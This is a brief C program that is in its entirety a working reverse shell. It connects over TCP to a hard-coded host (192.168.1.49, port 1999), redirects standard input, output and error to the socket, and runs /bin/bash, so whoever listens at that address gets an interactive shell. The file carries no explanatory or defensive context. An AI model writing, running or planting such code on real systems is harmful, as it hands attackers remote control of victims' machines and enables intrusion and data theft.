#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(1999);
    server_address.sin_addr.s_addr = inet_addr("192.168.1.49");
    int status = connect(
            client_socket,
            (struct sockaddr *) &server_address,
            sizeof(server_address)
            );
	if (status == -1){
		printf("Connection attempt failed!");
	}
	dup2(client_socket, 0);
	dup2(client_socket, 1);
	dup2(client_socket, 2);
    execve("/bin/bash", 0, 0);
    return 0;
}

